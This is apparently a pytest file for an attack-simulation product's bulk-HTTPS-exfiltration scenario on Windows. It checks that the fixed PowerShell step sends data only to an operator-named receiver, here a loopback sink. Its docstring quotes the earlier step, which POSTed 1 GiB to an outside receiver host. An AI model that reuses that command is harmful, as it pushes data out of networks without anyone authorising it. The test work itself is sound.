"""SIM-NDR-005 on Windows: the bulk upload goes only where the operator says.

CONT-16. The Windows variant of step-02 was::

    1..4 | ForEach-Object { Invoke-WebRequest -Uri https://exfil-receiver.testmynids.org/upload
        -Method POST -Body ([byte[]]::new(268435456)) -UseBasicParsing }

Three things were wrong with it, and since the push fix that made PowerShell
steps actually run, none of them is latent any more:

* it pushed 1 GiB from inside a customer network to a host neither the
  customer nor Palo Alto Networks controls, with no operator decision;
* it built four 256 MiB arrays inside one Windows PowerShell process;
* the payload was zero bytes, while the step is named "random payload".

The Windows leg now takes its destination from ``CORTEXSIM_EXFIL_URL`` and
refuses without it, and streams one reused 4 MiB random buffer.

What this file proves, and where. The static checks run everywhere. The
execution checks run the resolved step text as its own script, the way the
beacon does, against a byte-counting sink on 127.0.0.1, under whatever
PowerShell is on PATH. Here that is pwsh 7, whose ``HttpWebRequest`` is a shim
over ``HttpClient``: it proves the destination handling, the request count,
the byte count and the exit codes. It does NOT prove that Windows PowerShell
5.1 streams without buffering; no Windows host has run this.

The Linux primary and the macOS variant still name the hard-coded receiver.
That is reported, not changed here: making them refuse changes a POSIX bundle
that existed before this pass.
"""
from __future__ import annotations

import logging
import os
import re
import shutil
import subprocess
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

from engine import push_generator as pg
from engine import scenario_loader as sl

REPO = Path(__file__).resolve().parents[2]
SCENARIO = REPO / "scenarios" / "ndr" / "ndr-005-bulk-https-exfil.yml"
INPUT = "CORTEXSIM_EXFIL_URL"
IS_WINDOWS = sys.platform == "win32"
_REQUIRE = os.environ.get("CORTEXSIM_REQUIRE_POWERSHELL") == "1" or bool(os.environ.get("CI"))

_LITERAL_URL = re.compile(r"https?://[A-Za-z0-9]")
_BIG_ARRAY = re.compile(r"(?i)\[byte\[\]\]::new\(\s*(\d+)\s*\)|New-Object\s+byte\[\]\s+\(?\s*(\d+)")


def _doc() -> dict:
    logging.disable(logging.CRITICAL)
    try:
        schema, err = sl._parse_and_validate(str(SCENARIO))
    finally:
        logging.disable(logging.NOTSET)
    assert schema is not None and not err, err
    return schema.model_dump()


DOC = _doc()
WINDOWS = {s.step_id: s for s in pg.resolve_target(DOC, "windows").steps}


def test_the_scenario_still_emits_a_windows_bundle():
    """A zero is degraded: every check below reads the resolved Windows text."""
    assert pg.resolve_target(DOC, "windows").emittable
    assert set(WINDOWS) == {"step-01", "step-02"}
    assert all(s.source == "variant:windows" and s.shell == "powershell" for s in WINDOWS.values())


@pytest.mark.parametrize("step_id", ["step-01", "step-02"])
def test_windows_text_names_no_destination_of_its_own(step_id):
    text = WINDOWS[step_id].command
    assert not _LITERAL_URL.search(text), f"{step_id} hard-codes a URL:\n{text}"
    assert "testmynids" not in text
    assert f"$env:{INPUT}" in text


@pytest.mark.parametrize("step_id", ["step-01", "step-02"])
def test_the_receiver_is_a_required_operator_input(step_id):
    """Required, not optional: the bundle's preflight then refuses the step
    (not-executed, OPERATOR_INPUT_MISSING) instead of running it somewhere."""
    required, optional = pg._operator_inputs(WINDOWS[step_id].command)
    assert required == [INPUT], (required, optional)
    assert optional == []


def test_the_bundle_header_tells_the_operator_before_anything_runs():
    header = pg.generate_powershell(DOC).split("$ErrorActionPreference", 1)[0]
    block = header.split("Required operator inputs", 1)[1].split("Optional operator inputs", 1)[0]
    assert re.search(rf"{INPUT}\s+<- step-01, step-02", block), block


def test_no_step_builds_a_quarter_gigabyte_array():
    sizes = [int(a or b) for a, b in _BIG_ARRAY.findall(WINDOWS["step-02"].command)]
    assert sizes, "step-02 allocates no buffer at all; the check is not reading the upload"
    assert max(sizes) <= 16 * 1024 * 1024, f"step-02 allocates {max(sizes)} bytes in one array"


def test_no_windows_text_in_the_corpus_allocates_a_huge_array():
    """Corpus-wide: a 256 MiB array per request is a memory spike on the
    customer's endpoint, four times over."""
    logging.disable(logging.CRITICAL)
    try:
        bad: list[str] = []
        for path in sl._find_yaml_files(str(REPO / "scenarios")):
            schema, err = sl._parse_and_validate(path)
            if err or schema is None:
                continue
            for st in schema.model_dump().get("steps") or []:
                text = (st.get("platform_variants") or {}).get("windows") or ""
                for a, b in _BIG_ARRAY.findall(text):
                    if int(a or b) > 64 * 1024 * 1024:
                        bad.append(f"{schema.scenario_id} {st['id']}: {int(a or b)} bytes")
    finally:
        logging.disable(logging.NOTSET)
    assert not bad, bad


# ---------------------------------------------------------------------------
# Execution, against a loopback sink
# ---------------------------------------------------------------------------

class _Sink(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _record(self, method: str) -> None:
        want = int(self.headers.get("Content-Length") or 0)
        left = want
        while left > 0:
            chunk = self.rfile.read(min(left, 1 << 20))
            if not chunk:
                break
            left -= len(chunk)
        self.server.seen.append((method, self.path, want - left))  # type: ignore[attr-defined]
        self.send_response(200)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_POST(self):  # noqa: N802
        self._record("POST")

    def do_HEAD(self):  # noqa: N802
        self._record("HEAD")

    def log_message(self, *args):  # noqa: D401
        return


@pytest.fixture
def sink():
    srv = ThreadingHTTPServer(("127.0.0.1", 0), _Sink)
    srv.seen = []  # type: ignore[attr-defined]
    thread = threading.Thread(target=srv.serve_forever, daemon=True)
    thread.start()
    try:
        yield srv
    finally:
        srv.shutdown()
        srv.server_close()


@pytest.fixture(scope="module")
def ps_exe() -> str:
    exe = (shutil.which("powershell.exe") or shutil.which("pwsh")) if IS_WINDOWS else shutil.which("pwsh")
    if exe is None:
        if _REQUIRE:
            pytest.fail("PowerShell is required here (CI or CORTEXSIM_REQUIRE_POWERSHELL=1) but none is on PATH")
        pytest.skip("no PowerShell interpreter on PATH")
    return exe


def _run_step(ps_exe: str, step_id: str, tmp_path: Path, url: str | None) -> subprocess.CompletedProcess:
    """Run the resolved Windows text as its own script, as the beacon does."""
    script = tmp_path / f"{step_id}.ps1"
    # Windows PowerShell 5.1 reads a BOM-less file as ANSI.
    script.write_text(WINDOWS[step_id].command, encoding="utf-8-sig")
    env = {k: v for k, v in os.environ.items() if not k.startswith("CORTEXSIM_")}
    env.update({"TEMP": str(tmp_path), "TMP": str(tmp_path)})
    # The sink is on loopback: no proxy may sit between the step and it.
    for k in list(env):
        if k.lower() in ("http_proxy", "https_proxy", "all_proxy"):
            del env[k]
    env["NO_PROXY"] = "127.0.0.1"
    if url is not None:
        env[INPUT] = url
    args = [ps_exe, "-NoProfile", "-NonInteractive"]
    if IS_WINDOWS:
        args += ["-ExecutionPolicy", "Bypass"]
    return subprocess.run(
        args + ["-File", str(script)], env=env, capture_output=True, text=True,
        timeout=300, encoding="utf-8", errors="replace", cwd=str(tmp_path),
    )


def _url(srv: ThreadingHTTPServer) -> str:
    return f"http://127.0.0.1:{srv.server_address[1]}/upload"


def test_step_02_sends_four_256_mib_posts_to_the_named_receiver(ps_exe, tmp_path, sink):
    proc = _run_step(ps_exe, "step-02", tmp_path, _url(sink))
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out[-2000:]
    assert sink.seen == [("POST", "/upload", 268435456)] * 4, sink.seen
    assert "cortexsim-ndr-005-bulk-upload requests_sent=4 of 4" in out, out[-2000:]


@pytest.mark.parametrize("step_id", ["step-01", "step-02"])
@pytest.mark.parametrize("url", [None, "", "ftp://127.0.0.1/upload", "exfil-receiver.example"])
def test_without_a_receiver_the_step_sends_nothing_and_fails(ps_exe, tmp_path, sink, step_id, url):
    """The pull path has no preflight: the step text itself must refuse, by
    name, with a non-zero exit, and send nothing."""
    proc = _run_step(ps_exe, step_id, tmp_path, url)
    out = proc.stdout + proc.stderr
    assert proc.returncode != 0, out[-2000:]
    assert INPUT in out, out[-2000:]
    assert sink.seen == []
    assert "requests_sent" not in out


def test_step_01_probes_the_named_receiver_only(ps_exe, tmp_path, sink):
    proc = _run_step(ps_exe, "step-01", tmp_path, _url(sink))
    out = proc.stdout + proc.stderr
    assert proc.returncode == 0, out[-2000:]
    assert sink.seen == [("HEAD", "/upload", 0)], sink.seen


def test_a_receiver_that_does_not_answer_fails_step_02(ps_exe, tmp_path):
    """A refused connection is not an upload: the step must not read as sent."""
    srv = ThreadingHTTPServer(("127.0.0.1", 0), _Sink)
    port = srv.server_address[1]
    srv.server_close()  # nothing listens on this port now
    proc = _run_step(ps_exe, "step-02", tmp_path, f"http://127.0.0.1:{port}/upload")
    out = proc.stdout + proc.stderr
    assert proc.returncode != 0, out[-2000:]
    assert "requests_sent=0 of 4" in out, out[-2000:]
